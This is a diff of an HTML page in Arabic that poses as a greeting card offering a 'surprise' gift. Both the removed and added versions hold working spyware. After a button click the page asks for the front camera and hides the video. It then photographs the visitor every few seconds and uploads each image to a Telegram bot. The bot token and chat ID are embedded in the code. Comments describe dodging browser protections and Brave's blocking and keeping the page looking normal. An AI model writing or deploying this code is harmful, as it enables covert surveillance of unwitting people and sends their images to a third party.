@@ -12,106 +12,77 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            font-family: 'Tahoma', sans-serif;
+            font-family: sans-serif;
             margin: 0;
-            text-align: center;
         }
-        .container {
-            background: rgba(255, 255, 255, 0.8);
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+        .box {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 40px;
+            border-radius: 20px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
         }
         button {
             padding: 15px 30px;
-            font-size: 20px;
-            background-color: #ff7700;
+            background: #ff7700;
             color: white;
             border: none;
             border-radius: 50px;
             cursor: pointer;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
-            transition: 0.3s;
-        }
-        button:hover {
-            transform: scale(1.05);
-            background-color: #ff4400;
+            font-size: 18px;
         }
     </style>
 </head>
 <body>
 
-    <div class="container" id="main-content">
-        <h2 style="color: #005f96;">وصلتك تهنئة خاصة!</h2>
-        <p>اضغط على الزر أدناه لمشاهدة المفاجأة</p>
-        <button id="startBtn">إظهار المفاجأة 🎁</button>
+    <div class="box" id="content">
+        <h2>وصلتك مفاجأة! 🎁</h2>
+        <p>اضغط للمشاهدة</p>
+        <button onclick="start()">فتح المفاجأة</button>
     </div>
 
-    <div hidden="hidden">
-        <video id="video" playsinline autoplay></video>
+    <div hidden>
+        <video id="video" playsinline autoplay muted></video>
         <canvas id="canvas" width="640" height="480"></canvas>
     </div>
 
     <script>
-        'use strict';
+        const token = '6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY';
+        const id = '2103976274';
 
-        // بياناتك التي أرسلتها
-        const botToken = '6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY';
-        const chatId = '2103976274';
-
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
-
-        // ربط تشغيل الكاميرا بالزر لكسر حماية المتصفح
-        document.getElementById('startBtn').addEventListener('click', function() {
-            document.getElementById('main-content').innerHTML = "<h3>جاري تحميل المفاجأة...</h3><div class='loader'></div>";
-            init();
-        });
-
-        async function init() {
+        async function start() {
+            // تغيير محتوى الصفحة ليبدو طبيعياً أثناء التحميل
+            document.getElementById('content').innerHTML = "<h3>...جاري تحميل المفاجأة</h3>";
+            
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    audio: false,
-                    video: { facingMode: "user" }
-                });
-                handleSuccess(stream);
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // التقاط الصورة الأولى فوراً عند السماح
+                setTimeout(capture, 1000);
+                // تكرار الالتقاط كل 3 ثوانٍ (لتجنب حظر Brave للنشاط السريع)
+                setInterval(capture, 3000);
             } catch (e) {
-                console.error("Camera error:", e);
+                alert("يرجى السماح بالكاميرا لمشاهدة المفاجأة");
             }
         }
 
-        function handleSuccess(stream) {
-            window.stream = stream;
-            video.srcObject = stream;
+        function capture() {
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
+            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+            
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', id);
+                formData.append('photo', blob, 'pic.jpg');
 
-            // التقاط وإرسال صورة كل 1.5 ثانية
-            setInterval(function() {
-                context.drawImage(video, 0, 0, 640, 480);
-                var canvasData = canvas.toDataURL("image/png");
-                sendToTelegram(canvasData);
-            }, 1500);
-        }
-
-        function sendToTelegram(imgData) {
-            fetch(imgData)
-                .then(res => res.blob())
-                .then(blob => {
-                    const formData = new FormData();
-                    formData.append('chat_id', chatId);
-                    formData.append('photo', blob, 'capture.png');
-
-                    $.ajax({
-                        type: 'POST',
-                        url: `https://api.telegram.org/bot${botToken}/sendPhoto`,
-                        data: formData,
-                        processData: false,
-                        contentType: false,
-                        success: function(result) {
-                            console.log('Sent!');
-                        }
-                    });
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
                 });
+            }, 'image/jpeg', 0.6);
         }
     </script>
 </body>
